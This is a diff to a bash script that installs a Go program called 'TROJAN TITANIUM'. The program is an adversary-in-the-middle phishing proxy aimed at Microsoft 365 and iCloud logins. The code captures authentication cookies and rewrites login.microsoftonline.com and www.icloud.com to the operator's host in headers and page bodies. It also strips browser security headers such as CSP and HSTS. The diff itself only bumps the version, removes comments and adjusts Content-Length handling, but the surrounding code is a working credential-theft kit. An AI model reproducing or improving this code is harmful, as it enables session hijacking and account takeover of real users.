@@ -1,5 +1,5 @@
 #!/bin/bash
-# 🏛️ TROJAN - TITANIUM V18.8 - AIRTIGHT HOST-ENFORCEMENT
+# 🏛️ TROJAN - TITANIUM V18.9 - CONTENT-LENGTH VALIDATED
 # --------------------------------------------------------
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -85,7 +85,7 @@ import (
 )
 func main() {
 	base := "$USER_DOMAIN"
-	fmt.Println("\033[1;35m🏛️  TROJAN TITANIUM ENGINE v18.8\033[0m")
+	fmt.Println("\033[1;35m🏛️  TROJAN TITANIUM ENGINE v18.9\033[0m")
 	certmagic.DefaultACME.Agreed = true
 	certmagic.DefaultACME.Email = "admin@" + base
 	mux := http.NewServeMux()
@@ -99,7 +99,7 @@ func main() {
 }
 EOF
 
-# B. proxy.go (Airtight Host-Enforcement Version)
+# B. proxy.go (Airtight Host-Enforcement with Content-Length Validator)
 cat << 'EOF' > /root/TrojanProject/proxy.go
 package main
 import (
@@ -116,7 +116,6 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 	proxy := httputil.NewSingleHostReverseProxy(remote)
 	myHost := r.Host 
 
-	// HOST ENFORCEMENT & IP SPOOF PROTECTION
 	r.Host = remote.Host
 	r.URL.Host = remote.Host
 	r.URL.Scheme = remote.Scheme
@@ -133,20 +132,17 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 	}
 
 	proxy.ModifyResponse = func(resp *http.Response) error {
-		// 1. DYNAMIC HEADER SWEEP (Catches Office & iCloud Breakouts)
 		for header, values := range resp.Header {
 			for i, v := range values {
 				if strings.Contains(strings.ToLower(v), strings.ToLower(t.BaseDomain)) {
 					resp.Header[header][i] = strings.ReplaceAll(v, t.BaseDomain, myHost)
 				}
-				// Specific catch for Microsoft OAuth leaks
 				if strings.Contains(v, "login.microsoftonline.com") {
 					resp.Header[header][i] = strings.ReplaceAll(v, "login.microsoftonline.com", myHost)
 				}
 			}
 		}
 
-		// 2. CAPTURE & SUCCESS REDIRECT
 		for _, c := range resp.Cookies() {
 			for _, auth := range t.AuthCookies {
 				if strings.Contains(c.Name, auth) {
@@ -158,26 +154,25 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 			}
 		}
 
-		// 3. SECURITY STRIP
 		resp.Header.Del("Content-Security-Policy")
 		resp.Header.Del("X-Frame-Options")
 		resp.Header.Del("X-Content-Type-Options")
 		resp.Header.Del("Strict-Transport-Security")
 
-		// 4. AIRTIGHT BODY REWRITE (HTML/JS/JSON)
 		contentType := resp.Header.Get("Content-Type")
 		if strings.Contains(contentType, "text") || strings.Contains(contentType, "javascript") || strings.Contains(contentType, "json") {
 			oldBody, _ := io.ReadAll(resp.Body)
 			bodyStr := string(oldBody)
 			
 			newContent := strings.ReplaceAll(bodyStr, t.BaseDomain, myHost)
-			// Secondary sweep for hardcoded Microsoft/Apple endpoints
 			newContent = strings.ReplaceAll(newContent, "login.microsoftonline.com", myHost)
 			newContent = strings.ReplaceAll(newContent, "www.icloud.com", myHost)
 			
-			resp.Body = io.NopCloser(bytes.NewBufferString(newContent))
-			resp.ContentLength = int64(len(newContent))
-			resp.Header.Set("Content-Length", fmt.Sprint(len(newContent)))
+			// --- CONTENT-LENGTH VALIDATOR ---
+			bodyBytes := []byte(newContent)
+			resp.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
+			resp.ContentLength = int64(len(bodyBytes))
+			resp.Header.Set("Content-Length", fmt.Sprint(len(bodyBytes)))
 		}
 		return nil
 	}
